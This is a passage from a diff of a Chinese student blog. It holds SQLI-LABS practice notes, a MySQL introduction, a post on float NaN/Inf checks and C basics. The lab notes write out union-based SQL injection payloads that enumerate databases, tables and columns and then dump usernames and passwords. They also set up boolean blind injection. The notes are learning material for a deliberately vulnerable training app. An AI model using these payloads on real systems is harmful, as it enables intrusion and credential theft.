进行查询（不断改变0或者1的值，这种方法很慢，可以使用 group_concat()进行查询，可以将所有的数据连接拼接后作为一行显示（百度查询group_concat()的详细用法））</span><br><span class="line">所以输入为：?id=-1&#x27; union  select 1,2,group_concat(schema_name) from information_schema.schemata  limit 0,1--+   可以得到密码为（Your Password:information_schema,challenges,fan,mysql,performance_schema,security,test）</span><br><span class="line">然后对security进行操作（与上面语句类似只是将查库改为查表）</span><br><span class="line">输入为：?id=-1&#x27; union  select 1,2,group_concat(table_name) from information_schema.tables  where table_schema=&#x27;security&#x27;--+  然后取出密码为（Your Password:emails,referers,uagents,users）  （这里需要注意：对于&#x27;security&#x27;不推荐使用单引号，因为这样会引入单引号的问题，推荐使用16进制，使用方法：去掉单引号，在security前面加入0x，然后将security转化为16进制，转化方法为，选中security，然后在encoding里面选择编码 hexadecimal encode即可，最后变为：0x736572637572697479--+，执行效果与单引号相同，只是能避免一些不必要的问题）</span><br><span class="line">然后在进行查列：?id=-1&#x27; union  select 1,2,group_concat(column_name) from information_schema.columns  where table_name=0x7573657273--+   然后取出密码中的数据：（Your Password:id,username,password）  然后在进行取数据</span><br><span class="line"></span><br><span class="line">8.输入：?id=-1&#x27; union  select 1,2,group_concat(username) from security.users--+   然后显示取出了所有的username,   将括号里面的（username）改为（password）即可取出password里面的数据  （但是这样分开并不太好看，利用这个函数即可将两组数据全部显示：concat_ws(&#x27;~&#x27;,A,B)   显示为A~B）  ----输入为：?id=-1&#x27; union  select 1,2,concat_ws(&#x27;~&#x27;,username,username) from security.users--+（但是这样发现只区出了一个数据：Your Password:Dumb~Dumb）    然后使用刚刚的group_concat()函数再次包裹进行显示   输入为：?id=-1&#x27; union  select 1,2,group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users--+（发现所有的数据，账户和密码都被取出来了）     需要注意(遇到单引号都推荐使用16进制，所以前面的&#x27;~&#x27;，这个要改为16进制，前面有说到方法)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><strong>Less-2记录</strong></p>
 <p>跟着视频一步一步做完第一题，大脑里面模模糊糊好像有一点的结构，又好像没有，多做做再看看</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.与第一题一样，输入：?id=1&#x27;   发现有SQL语句报错，但是从报错信息发现这一题?id=1&#x27;后面的分号不需要（与第一题的区别就是?id=1后面无单引号）</span><br><span class="line">2.输入：?id=1  order by 3--+  显示正常，改变3这个数字，发现3就正确</span><br><span class="line">3.后面就是与第一题一样，将数据取出；</span><br><span class="line">4.输入：?id=1  union select 1,2,3--+ （利用union语句观察有哪些数据可以回写）   显示无回写    然后利用将?id=1的1前面加一个负号   然后有回写内容（用户名2，密码3）</span><br><span class="line">接下来的步骤第一题一样</span><br><span class="line">5.输入：?id=-1 union select 1,2,group_concat(schema_name)  from information_schema.schemata--+   （然后就取出了里面所有的数据）</span><br><span class="line">6.输入：?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=&#x27;security&#x27;--+   (查看security里面的所有表)</span><br><span class="line">7.（查看所有的列信息）：?id=-1&quot;)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;userd&#x27;--+</span><br><span class="line">7.直接取出列中全部信息：?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,username)) from security.users--+</span><br><span class="line">8. concat_ws:意思是将username和password以~进行隔开</span><br><span class="line">   group_concat:将所有的数据连接拼接后作为一行显示</span><br><span class="line">   from security.users：就是从securityd的这个库里取出users表里的所有数据</span><br></pre></td></tr></table></figure>
-
 <p><strong>Less-3记录</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.对比123发现输入：?id=1  </span><br><span class="line">  SQL语句分别为：SELECT * FROM users WHERE id=&#x27;1&#x27; LIMIT 0,1    后面均为?id=-1&#x27;</span><br><span class="line">                SELECT * FROM users WHERE id=1 LIMIT 0,1     后面均为?id=-1 </span><br><span class="line">                SELECT * FROM users WHERE id=(&#x27;1&#x27;) LIMIT 0,1  后面均?id=-1’)</span><br><span class="line">   对比发现区别就是1，所有第三关只需要将?id=1改为?id=1’)即可</span><br><span class="line">   后面的就与12关相同了</span><br></pre></td></tr></table></figure>
-
 <p><strong>Less-4记录</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.输入：?id=1   SQL语句为：SELECT * FROM users WHERE id=(&quot;1&quot;) LIMIT 0,1   猜测后面均为：?id=-1&quot;)     然后输入：?id=1&#x27;&#x27;)--+  发现返回没问题，猜测正确     然后后面步骤与前面类似</span><br><span class="line">2.这里不知道为什么输入：?id=1&quot;)  order by 4--+   改变4的值都不报错，（目前也不知道为什么），然后重新输入后发现3就是对的</span><br><span class="line">      后面同样与前面相同</span><br></pre></td></tr></table></figure>
-
 <p><strong>知识补充</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">以下所打开的数据库均为：security</span><br><span class="line">1.left()函数： eg：left(databaase(),1)=&#x27;s&#x27;    left(a,b)从左侧截取a的前b位，正确返回为1，错误返回为0</span><br><span class="line"> 在MySQL命令行执行（前提，打开security库）：select left(database(),1)=&#x27;s&#x27;;返回1</span><br><span class="line">                                         select left(database(),3)=&#x27;s&#x27;;返回0</span><br><span class="line">                                         select left(database(),3)=&#x27;sec&#x27;;返回1</span><br><span class="line">                                         select left(database(),1)=&#x27;u&#x27;;</span><br><span class="line">2.regexp函数（正则表达式）： eg:select user() regexp &#x27;r&#x27;    user()的结果是root，regexp为匹配root的正则表达式   </span><br><span class="line">  意思是对于当前的用户从左往右匹配，无论为&#x27;r&#x27;还是&#x27;root&#x27;都返回1，当为&#x27;rot&#x27;则返回0；</span><br><span class="line">  MySQL命令行执行：selsect user();显示当前用户系统:root@localhost</span><br><span class="line">  输入：select user() regexp &#x27;r&#x27;为1，select user() regexp &#x27;root&#x27;为1；select user() regexp &#x27;root &#x27;为0,。。。。。</span><br><span class="line">3.like函数：select user() like &#x27;r%&#x27;   与regexp()函数类似，只是&#x27;root%&#x27;里面多了一个%号；</span><br><span class="line">4.substr(a,b,c):   eg:select substr() XXXX 意思是：substr(a,b,c)从b位置开始，截取a字符串c位长度  </span><br><span class="line">命令行输入：select substr((select database()),1,1)=&#x27;s&#x27;;返回1</span><br><span class="line">5.ascii()    意思是将某个字符串转化为ascii值；</span><br><span class="line">  命令行：select ascii(&#x27;a&#x27;);   为97</span><br><span class="line">6.chr(数字)或者ord(&#x27;字母&#x27;)      使用python中的两个函数可以判断当前的ascii值是多少</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><strong>Less-5记录</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.输入：?id=1  显示：You are in...........</span><br><span class="line">  （这是典型的布尔盲注，当输入正确时，会返回一个结果：You are in...，当输入错误时，没有返回的结果）</span><br><span class="line">  加一个分号后，发现其存在注入漏洞</span><br><span class="line">2.输入：?id=1&#x27; order by 3--+    显示正确，数字改为4，无返回----得出：其有三列</span><br><span class="line">3：输入：?id=1&#x27; union select   1,2,3--+    无回写，返回依旧正确，不能用联合查询；</span><br><span class="line">4：使用left()函数,输入：?id=1&#x27; and  left((select database()),1)=&#x27;s&#x27;--+  显示有错误</span><br></pre></td></tr></table></figure>
-
 <p>图1：</p>
 <p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-02-05%20213219.png" alt="屏幕截图 2022-02-05 213219"></p>
 <p>图2：</p>
@@ -293,7 +3360,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/05/SQLI-LABS%E8%AE%AD%E7%BB%83%E8%AE%B0%E5%BD%95/" data-id="cl1a5wq3i0004ugtdf5ef8ii3" data-title="SQLI-LABS训练记录" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/05/SQLI-LABS%E8%AE%AD%E7%BB%83%E8%AE%B0%E5%BD%95/" data-id="cl1dk77jl000344td4r5j7cst" data-title="SQLI-LABS训练记录" class="article-share-link">Share</a>
       
       
       
@@ -338,7 +3405,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/05/SQL%E7%9A%84%E5%8D%B8%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85/" data-id="cl1a5wq3j0005ugtdhp90aii8" data-title="SQL的卸载与安装" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/05/SQL%E7%9A%84%E5%8D%B8%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85/" data-id="cl1dk77jn000544td2iekcrkr" data-title="SQL的卸载与安装" class="article-share-link">Share</a>
       
       
       
@@ -373,34 +3440,32 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>1.入门</p>
-<p>​     数据库—–服务器——web网页（我们所看见的软件网页）</p>
-<p>为什么要学习数据库？——–用来存储数据          存储数据库有数组、集合、内存……数组和集合属于内存(断电就没有了)，而内存不适合查询        对于数据库(1.可以持久化数据到本地。2.可以实现结构化查询，方便管理)      </p>
-<p>   常见数据库管理系统：mysql(成本低，开放源代码，免费使用，性能高，执行快，安装简单使用方便)、oracl(甲骨文，很贵，各方面都贵)、DB2（适合处理海量的数据）、sqlserver（微软，缺点，只能安装到Windows系统）…….</p>
-<p><strong>数据库的相关概念</strong>      </p>
-<p>1.DB(database)：数据库，存储数据的仓库，用来保存一组有组织的数据的容器。   </p>
-<p> 2.DBMS（database  management  system）：数据库管理系统(软件），管理DB中的数据,   </p>
+<p>​     数据库-----服务器------web网页（我们所看见的软件网页）</p>
+<p>为什么要学习数据库？--------用来存储数据          存储数据库有数组、集合、内存…数组和集合属于内存(断电就没有了)，而内存不适合查询        对于数据库(1.可以持久化数据到本地。2.可以实现结构化查询，方便管理)</p>
+<p>常见数据库管理系统：mysql(成本低，开放源代码，免费使用，性能高，执行快，安装简单使用方便)、oracl(甲骨文，很贵，各方面都贵)、DB2（适合处理海量的数据）、sqlserver（微软，缺点，只能安装到Windows系统）…</p>
+<p><strong>数据库的相关概念</strong></p>
+<p>1.DB(database)：数据库，存储数据的仓库，用来保存一组有组织的数据的容器。</p>
+<p>2.DBMS（database  management  system）：数据库管理系统(软件），管理DB中的数据,</p>
 <p>3.SQL（structure query language）：结构化查询语言，就是一种DBMS能懂得语言,专门与数据库通信的语                                                         言 。</p>
 <p>关系：人（程序员）—<code>SQL</code>—管家（DBMS）—<code>管理</code>—文件柜（DB）</p>
 <p><strong>SQL的优点</strong>：</p>
 <p>1.不是某个特定数据库供应商专有的语言，几乎所有的DBMS都支持SQL。</p>
 <p>2.简单易学，是一种强有力的语言，可以灵活使用其语言元素，进行非常复杂和高级的数据库操作</p>
 <p>3.DBA：数据库管理源，专门用来维护操作SQL语言</p>
-<p>**数据库的特点： ** </p>
-<p>  1：将数据放到表中，表在放到库中</p>
+<p>**数据库的特点： **</p>
+<p>1：将数据放到表中，表在放到库中</p>
 <p>2.一个数据库中有多个表，每个表都有自己的名字，名字唯一。表有一些特性，这些特性定义了数据在表中如何存储，类似于java中“类”的设计。</p>
 <p>3.表由列组成，在数据库中我们叫做<em><strong>字段</strong></em>。所有的表都由一列或者多列组成，每一列类似于java中的“属性”。表中的数据按行存储，类似于java中的’对象’。</p>
 <p>SQL的登陆：命令行输入：mysql -h localhost（主机名） -P 3306（端口号） -u root（用户名） -p （或者输入 ：mysql -u root -p）     然后输入密码         退出输入：exit</p>
 <p><strong>MySQL常见命令</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.MySQL是用分号；（推荐使用分号）或者\g结束语句</span><br><span class="line">2.显示有哪些数据库：show databases</span><br><span class="line">      1.indormation_schema:保存一些源数据信息</span><br><span class="line">      2.mysql:专门用来保存用户的信息</span><br><span class="line">      3.performaance_schema:用于收集一些性能信息</span><br><span class="line">      4.text:用于测试，里面没有表，可以直接在里面建表及修改数据库等，其余的不能</span><br><span class="line">3.打开某一个数据库:use text(库名)；</span><br><span class="line">4.查看当前库里的所有表：show tables；</span><br><span class="line">5.查看自己在那个库：select database();</span><br><span class="line">6.库里创建表：creste table 表的名字（</span><br><span class="line">       列明  类型，</span><br><span class="line">       列明   类型，</span><br><span class="line">       。。。。。</span><br><span class="line">       ）；</span><br><span class="line"> 7.查看其他库的所有表：show tables from 库名；</span><br><span class="line"> 8.查看表的结构： desc 表名；</span><br><span class="line"> 9.查看服务器版本：1.在MySQL服务端：select version;   2.不在MySQL服务端：mysql --version或者mysql --V</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
 <p>MySQL的语法规范：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.MySQL不区分大小写，但是建议关键字大写（目前不用管，后面的客户端会自动规范）</span><br><span class="line">2.分号结尾或者\g</span><br><span class="line">3。每条命令根据需要，可以缩进或者换行</span><br><span class="line">4.注释：单行注释：1.#注释内容</span><br><span class="line">                 2.-- 注释内容   （注意--后面有个空格）</span><br><span class="line">        多行注释：/*注释内容*/（与C语言相同）；</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/05/SQL/" data-id="cl1a5wq3h0003ugtd8r41daxx" data-title="SQL" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/05/SQL/" data-id="cl1dk77jm000444tddwdnbnhv" data-title="SQL" class="article-share-link">Share</a>
       
       
       
@@ -437,19 +3502,29 @@
         <p>进行浮点数编程时，如果没有注意，常常会出现输出类似 1.#IND, 1.#INF 或者 nan, inf 之类奇怪的输出。这通常隐含了浮点数操作的异常。</p>
 <p>特殊浮点数的含义</p>
 <p>1.#INF / inf：这个值表示“无穷大 (infinity 的缩写)”，即超出了计算机可以表示的浮点数的最大范围（或者说超过了 double 类型的最大值）。例如，当用 0 除一个整数时便会得到一个1.#INF / inf值；相应的，如果用 0 除一个负整数也会得到 -1.#INF / -inf 值。</p>
-<p>-1.#IND / nan：这个的情况更复杂，一般来说，它们来自于任何未定义结果（非法）的浮点数运算。”IND”是 indeterminate 的缩写，而”nan”是 not a number 的缩写。产生这个值的常见例子有：对负数开平方，对负数取对数，0.0/0.0，0.0*∞, ∞/∞ 等。</p>
+<p>-1.#IND / nan：这个的情况更复杂，一般来说，它们来自于任何未定义结果（非法）的浮点数运算。&quot;IND&quot;是 indeterminate 的缩写，而&quot;nan&quot;是 not a number 的缩写。产生这个值的常见例子有：对负数开平方，对负数取对数，0.0/0.0，0.0*∞, ∞/∞ 等。</p>
 <p>简而言之，如果遇到 1.#INF / inf，就检查是否发生了运算结果溢出除零，而遇到 1.#IND / nan，就检查是否发生了非法的运算。</p>
 <p>特殊浮点数的判断</p>
 <p>很多 C 库都提供了一组函数用来判断一个浮点数是否是无穷大或 NaN。int _isnan(double x) 函数用来判断一个浮点数是否是 NaN，而 int _finite(double x) 用以判断一个浮点数是否是无穷大。</p>
 <p>你可能已经注意到了，上面两个函数都是以下划线开头的，因此在可移植性上可能是存在问题的，那么如何实现一个通用的判断版本呢？首先，对于 Nan，可以用下面的代码实现：</p>
-<p>bool IsNumber(double x)<br>{<br>  // 这里的比较操作看上去总是会得到 true<br>  // 但有趣的是对于 IEEE 754 浮点数 NaN 来说总会得到 false!<br>  return (x == x);<br>}<br>而下面的代码可以判断一个浮点数是否是有限的（finite, 即既不是 NaN 又不是 infinite）：</p>
-<p>bool IsFiniteNumber(double x)<br>{<br>  return (x &lt;= DBL_MAX &amp;&amp; x &gt;= -DBL_MAX);<br>}<br>其中，DBL_MAX 是 &lt;float.h&gt; 中预定义的常量。</p>
+<p>bool IsNumber(double x)<br>
+{<br>
+// 这里的比较操作看上去总是会得到 true<br>
+// 但有趣的是对于 IEEE 754 浮点数 NaN 来说总会得到 false!<br>
+return (x == x);<br>
+}<br>
+而下面的代码可以判断一个浮点数是否是有限的（finite, 即既不是 NaN 又不是 infinite）：</p>
+<p>bool IsFiniteNumber(double x)<br>
+{<br>
+return (x &lt;= DBL_MAX &amp;&amp; x &gt;= -DBL_MAX);<br>
+}<br>
+其中，DBL_MAX 是 &lt;float.h&gt; 中预定义的常量。</p>
 <p>把上面两个函数结合起来，还可以实现一个浮点数是否是 Inf 的判断。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/07/%E6%B5%AE%E7%82%B9%E6%95%B0/" data-id="cl1a5wq3r000eugtd085a6hhe" data-title="浮点数" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/12/07/%E6%B5%AE%E7%82%B9%E6%95%B0/" data-id="cl1dk77ju000e44tdcsv7dfhk" data-title="浮点数" class="article-share-link">Share</a>
       
       
       
@@ -484,62 +3559,12 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">输入10各地区的面积（都是整数），对他们由小到大排序并输出排序后的结果</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a[10];  //定义一个包含10个数据的数组 </span><br><span class="line">	int i,j,t;</span><br><span class="line">	printf (&quot;请输入10个面积；\n&quot;);</span><br><span class="line">	for(i=0;i&lt;=9;i++)   //给a[0]到a[9]逐个赋值</span><br><span class="line">	 scanf (&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">	for (i=0;i&lt;=8;i++)     //用选择法逐个比较两个数</span><br><span class="line">	   for (j=i+1;j&lt;=9;j++)</span><br><span class="line">	      if (a[i]&gt;a[j])  //从a[0]和a[i]开始</span><br><span class="line">	    &#123;</span><br><span class="line">	    	t=a[i];</span><br><span class="line">	    	a[i]=a[j];</span><br><span class="line">	    	a[j]=t;</span><br><span class="line">		&#125;</span><br><span class="line">	printf(&quot;排序后的面积依次是：\n&quot;);</span><br><span class="line">	for(i=0;i&lt;=9;i++)</span><br><span class="line">	   printf (&quot;%d\n&quot;,a[i]);   //%5d指数和数之间间隔5个空格，%.5f指保留5位小数</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>排序方法  1.选择法：用两个数逐次比较，把数小的放在前面              2。冒泡法（沉底发）：用两个数逐次比较，把数大的放在后面</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/12/05/%E6%95%B0%E7%BB%84%E5%88%86%E6%9E%90/" data-id="cl1a5wq3p000dugtdhd4xanaj" data-title="数组分析" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-常见关键字" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/11/13/%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/" class="article-date">
-  <time class="dt-published" datetime="2021-11-13T01:57:26.000Z" itemprop="datePublished">2021-11-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/11/13/%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/">常见关键字</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>一.数据类型关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char ：声明字符型变量或函数</span><br><span class="line">double ：声明双精度变量或函数</span><br><span class="line">float：声明浮点型变量或函数</span><br><span class="line">int： 声明整型变量或函数</span><br><span class="line">long ：声明长整型变量或函数</span><br><span class="line">short ：声明短整型变量或函数</span><br><span class="line">unsigned：声明无符号类型变量或函数</span><br><span class="line">void ：声明函数无返回值或无参数，声明无类型指针（基本上就这三个作用）</span><br><span class="line">enum ：声明枚举类型</span><br><span class="line">signed：声明有符号类型变量或函数</span><br><span class="line">struct：声明结构体变量或函数</span><br><span class="line">union：声明共用体（联合）数据类型</span><br></pre></td></tr></table></figure>
-
-<p>二.控制语句和关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">控制语句</span><br><span class="line">goto语句:      无条件转向</span><br><span class="line">if语句:        判断语句</span><br><span class="line">while语句：    循环</span><br><span class="line">do-while语句:  先执行循环体,然后判断循环条件是否成立. 之后继续循环</span><br><span class="line">for语句:        循环,可替代while语句，只是用法不太一样</span><br><span class="line">break语句：     跳出本层的循环(只跳出包含此语句的循环)</span><br><span class="line">continue语句:   继续，一般放到循环语句里,不在执行它下面的语句,直接跳到判断语句</span><br><span class="line">                eg:for语句,就直接跳到第二个分号处,while语句,就直接跳到while()的括号里</span><br><span class="line">switch语句:     多相选择</span><br><span class="line">return语句:     返回</span><br><span class="line">1.循环语句</span><br><span class="line">        for：一种循环语句(可意会不可言传）</span><br><span class="line">        do ：循环语句的循环体</span><br><span class="line">        while ：循环语句的循环条件</span><br><span class="line">        break：跳出当前循环</span><br><span class="line">        continue：结束当前循环，开始下一轮循环</span><br><span class="line">2.条件语句</span><br><span class="line">        if: 条件语句</span><br><span class="line">        else ：条件语句否定分支（与 if 连用）</span><br><span class="line">        goto：无条件跳转语句</span><br><span class="line">3.开关语句</span><br><span class="line">        switch :用于开关语句</span><br><span class="line">        case：开关语句分支</span><br><span class="line">        default：开关语句中的“其他”分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>三、存储类型关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto ：声明自动变量 一般不使用</span><br><span class="line">extern：声明变量是在其他文件正声明（也可以看做是引用变量）</span><br><span class="line">register：声明积存器变量</span><br><span class="line">static ：声明静态变量</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/13/%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/" data-id="cl1a5wq3k0008ugtdccw974q0" data-title="常见关键字" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/12/05/%E6%95%B0%E7%BB%84%E5%88%86%E6%9E%90/" data-id="cl1dk77jt000d44td2417920q" data-title="数组分析" class="article-share-link">Share</a>
       
       
       
@@ -575,18 +3600,60 @@
       
         <p>一.数据类型关键字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char ：声明字符型变量或函数</span><br><span class="line">double ：声明双精度变量或函数</span><br><span class="line">float：声明浮点型变量或函数</span><br><span class="line">int： 声明整型变量或函数</span><br><span class="line">long ：声明长整型变量或函数</span><br><span class="line">short ：声明短整型变量或函数</span><br><span class="line">unsigned：声明无符号类型变量或函数</span><br><span class="line">void ：声明函数无返回值或无参数，声明无类型指针（基本上就这三个作用）</span><br><span class="line">enum ：声明枚举类型</span><br><span class="line">signed：声明有符号类型变量或函数</span><br><span class="line">struct：声明结构体变量或函数</span><br><span class="line">union：声明共用体（联合）数据类型</span><br><span class="line">注意：对于doublehe和float</span><br><span class="line">         区别是double精度高，有效数字16位，float精度7位。 但double消耗内存是float的两倍，double的运算速度比float慢得多，C语言中数学函数名称double 和 float不同，不要写错，能用单精度时不要用双精度（以省内存，加快运算速度）。  </span><br></pre></td></tr></table></figure>
-
 <p>二.控制语句和关键字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">控制语句</span><br><span class="line">goto语句:      无条件转向</span><br><span class="line">if语句:        判断语句</span><br><span class="line">while语句：    循环</span><br><span class="line">do-while语句:  先执行循环体,然后判断循环条件是否成立. 之后继续循环</span><br><span class="line">for语句:        循环,可替代while语句，只是用法不太一样</span><br><span class="line">break语句：     跳出本层的循环(只跳出包含此语句的循环)</span><br><span class="line">continue语句:   继续，一般放到循环语句里,不在执行它下面的语句,直接跳到判断语句</span><br><span class="line">                eg:for语句,就直接跳到第二个分号处,while语句,就直接跳到while()的括号里</span><br><span class="line">switch语句:     多相选择</span><br><span class="line">return语句:     返回</span><br><span class="line">1.循环语句</span><br><span class="line">        for：一种循环语句(可意会不可言传）</span><br><span class="line">        do ：循环语句的循环体</span><br><span class="line">        while ：循环语句的循环条件</span><br><span class="line">        break：跳出当前循环</span><br><span class="line">        continue：结束当前循环，开始下一轮循环</span><br><span class="line">2.条件语句</span><br><span class="line">        if: 条件语句</span><br><span class="line">        else ：条件语句否定分支（与 if 连用）</span><br><span class="line">        goto：无条件跳转语句</span><br><span class="line">3.开关语句</span><br><span class="line">        switch :用于开关语句</span><br><span class="line">        case：开关语句分支</span><br><span class="line">        default：开关语句中的“其他”分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>三、存储类型关键字</p>
